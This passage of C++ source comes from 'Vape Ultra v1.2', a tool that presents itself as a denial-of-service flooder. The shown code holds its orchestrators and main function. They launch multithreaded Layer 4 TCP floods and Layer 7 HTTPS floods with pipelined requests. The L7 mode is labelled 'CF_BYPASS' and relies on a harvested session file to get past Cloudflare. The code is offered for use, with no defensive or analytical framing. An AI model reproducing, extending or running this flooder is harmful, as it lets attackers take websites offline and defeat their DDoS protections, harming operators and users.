                    close_conn(i); open_conn(i);
                }
            }
        }
    }

    // Cleanup
    for (uint32_t i = 0; i < N; ++i) close_conn(i);
    ::close(epfd);
    SSL_CTX_free(ssl_ctx);
}

// ─── Orchestrators ────────────────────────────────────────────────────────────
static void run_l4(const Config& cfg, const sockaddr_in& addr, bool lownet) {
    uint32_t nw   = cfg.threads ? cfg.threads : std::max(1u, std::thread::hardware_concurrency());
    uint64_t fdlim = raise_fds((uint64_t)cfg.connections + nw * 32 + 512);
    uint32_t maxc  = (fdlim > 512) ? (uint32_t)(fdlim - 512) : 1;
    uint32_t conns = std::min(cfg.connections, maxc);

    const char* fmt = lownet ? L4_HTTP_FMT_LN : L4_HTTP_FMT;
    const int   pd  = lownet ? L4_PIPELINE_LN : L4_PIPELINE;

    char tmp[1024];
    int  tlen = std::snprintf(tmp, sizeof(tmp), fmt, cfg.host.c_str());
    std::string payload(tmp, tlen > 0 ? tlen : 0);
    size_t plen = payload.size();

    std::string pipe_buf;
    pipe_buf.reserve(plen * (size_t)pd);
    for (int i = 0; i < pd; ++i) pipe_buf += payload;

    std::vector<iovec> iov((size_t)pd);
    for (int i = 0; i < pd; ++i) {
        iov[i].iov_base = const_cast<char*>(pipe_buf.data() + (size_t)i * plen);
        iov[i].iov_len  = plen;
    }

    std::vector<Stats>       wstats(nw);
    std::vector<std::thread> wthreads;
    wthreads.reserve(nw);
    g_running.store(true, std::memory_order_release);

    uint32_t base = conns / nw, rem = conns % nw;
    for (uint32_t w = 0; w < nw; ++w) {
        L4WCtx wc{cfg, addr, wstats[w], payload.data(), plen, iov,
                  base + (w < rem ? 1u : 0u), cfg.pin_cpu ? (int)w : -1};
        wthreads.emplace_back(l4_worker, wc);
    }

    std::thread timer([&]() {
        for (uint32_t s = 0; s < cfg.duration; ++s) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            if (!g_running.load(std::memory_order_relaxed)) return;
        }
        g_running.store(false, std::memory_order_relaxed);
    });
    timer.join();
    g_running.store(false, std::memory_order_release);
    for (auto& t : wthreads) t.join();

    uint64_t rq = 0, er = 0, tx = 0, rx = 0;
    for (auto& s : wstats) {
        rq += s.requests.load(std::memory_order_relaxed);
        er += s.errors  .load(std::memory_order_relaxed);
        tx += s.bytes_tx.load(std::memory_order_relaxed);
        rx += s.bytes_rx.load(std::memory_order_relaxed);
    }
    std::printf("[L4%s] req=%-12lu  rps=%-10.0f  err=%-8lu  tx=%.2fMB  rx=%.2fMB\n",
        lownet ? "_lownet" : "",
        rq, rq / (double)cfg.duration, er, tx / 1e6, rx / 1e6);
}

static void run_l7(const Config& cfg, const sockaddr_in& addr, bool lownet) {
    // Load session first
    if (!session_load()) {
        std::fprintf(stderr, "[L7] ERROR: Could not load session.json — run l7_harvester.py first.\n");
        return;
    }

    uint32_t nw    = cfg.threads ? cfg.threads : std::max(1u, std::thread::hardware_concurrency());
    uint64_t fdlim = raise_fds((uint64_t)cfg.connections + nw * 32 + 1024);
    uint32_t maxc  = (fdlim > 1024) ? (uint32_t)(fdlim - 1024) : 1;
    uint32_t conns = std::min(cfg.connections, maxc);

    // Check session expiry warning
    {
        std::lock_guard<std::mutex> lk(g_session_mtx);
        int64_t now = (int64_t)std::time(nullptr);
        if (g_session.valid_until > 0 && g_session.valid_until < now) {
            std::fprintf(stderr, "[L7] WARNING: session.json appears expired. Proceeding anyway.\n");
        }
        std::fprintf(stderr, "[L7] Session loaded for host: %s  path: %s\n",
                     g_session.host.c_str(), g_session.path.c_str());
    }

    std::vector<Stats>       wstats(nw);
    std::vector<std::thread> wthreads;
    wthreads.reserve(nw);
    g_running.store(true, std::memory_order_release);

    // Start background session watcher
    std::thread watcher(session_watch_thread);

    uint32_t base = conns / nw, rem = conns % nw;
    for (uint32_t w = 0; w < nw; ++w) {
        L7WCtx wc{cfg, addr, wstats[w],
                  base + (w < rem ? 1u : 0u),
                  cfg.pin_cpu ? (int)w : -1,
                  lownet};
        wthreads.emplace_back(l7_worker, wc);
    }

    std::thread timer([&]() {
        for (uint32_t s = 0; s < cfg.duration; ++s) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            if (!g_running.load(std::memory_order_relaxed)) return;
        }
        g_running.store(false, std::memory_order_relaxed);
    });
    timer.join();
    g_running.store(false, std::memory_order_release);
    for (auto& t : wthreads) t.join();
    watcher.join();

    uint64_t rq = 0, er = 0, tx = 0, rx = 0;
    for (auto& s : wstats) {
        rq += s.requests.load(std::memory_order_relaxed);
        er += s.errors  .load(std::memory_order_relaxed);
        tx += s.bytes_tx.load(std::memory_order_relaxed);
        rx += s.bytes_rx.load(std::memory_order_relaxed);
    }
    std::printf("[L7%s] req=%-12lu  rps=%-10.0f  err=%-8lu  tx=%.2fMB  rx=%.2fMB\n",
        lownet ? "_lownet" : "",
        rq, rq / (double)cfg.duration, er, tx / 1e6, rx / 1e6);
}

// ─── Main ─────────────────────────────────────────────────────────────────────
int main(int argc, char** argv) {
    if (argc < 4) {
        std::fprintf(stderr,
            "Vape Ultra v1.2 — Developer: @Paxjest  Engine: @Xstairs\n\n"
            "Usage: %s <host> <port> <method> [connections=%u] [threads=auto] [duration=%us] [session=session.json]\n\n"
            "Methods:\n"
            "  l4         — Layer 4 TCP flood (normal)\n"
            "  l4_lownet  — Layer 4 TCP flood (minimum bandwidth, ~7x less TX)\n"
            "  l7         — Layer 7 HTTPS CF_BYPASS (reads session.json)\n"
            "  l7_lownet  — Layer 7 HTTPS CF_BYPASS (minimal headers)\n\n"
            "Layer 7 requires session.json from l7_harvester.py\n",
            argv[0], DEF_CONNS, 60u);
        return 1;
    }

    std::signal(SIGPIPE, SIG_IGN);
    std::signal(SIGINT,  on_signal);
    std::signal(SIGTERM, on_signal);

    Config cfg;
    cfg.host = argv[1];
    cfg.port = (uint16_t)std::atoi(argv[2]);
    if (cfg.port == 0) { std::fprintf(stderr, "Invalid port.\n"); return 1; }

    // Parse method
    std::string method_str = argv[3];
    bool is_l7 = false;
    bool lownet = false;
    if      (method_str == "l4")        { cfg.method = Method::L4;        }
    else if (method_str == "l4_lownet") { cfg.method = Method::L4_LOWNET; lownet = true; }
    else if (method_str == "l7")        { cfg.method = Method::L7;        is_l7  = true; }
    else if (method_str == "l7_lownet") { cfg.method = Method::L7_LOWNET; is_l7  = true; lownet = true; }
    else {
        std::fprintf(stderr, "Unknown method '%s'. Use: l4 | l4_lownet | l7 | l7_lownet\n", argv[3]);
        return 1;
    }

    if (argc > 4) cfg.connections = (uint32_t)std::atoi(argv[4]);
    if (argc > 5) cfg.threads     = (uint32_t)std::atoi(argv[5]);
    if (argc > 6) cfg.duration    = (uint32_t)std::atoi(argv[6]);
    if (argc > 7) g_session_file  = argv[7];

    // Resolve host
    sockaddr_in addr;
    try { addr = do_resolve(cfg.host, cfg.port, cfg.resolved_ip); }
    catch (...) { std::fprintf(stderr, "Failed to resolve host: %s\n", cfg.host.c_str()); return 1; }

    uint32_t nw = cfg.threads ? cfg.threads : std::max(1u, std::thread::hardware_concurrency());
    std::fprintf(stderr,
        "[Vape Ultra v1.2] %s:%u  method=%s  conns=%u  threads=%u  duration=%us\n",
        cfg.host.c_str(), cfg.port, method_str.c_str(), cfg.connections, nw, cfg.duration);
    if (is_l7) {
        std::fprintf(stderr, "[L7] session file: %s\n", g_session_file.c_str());
    }

    if (is_l7) run_l7(cfg, addr, lownet);
    else        run_l4(cfg, addr, lownet);

    return 0;
}
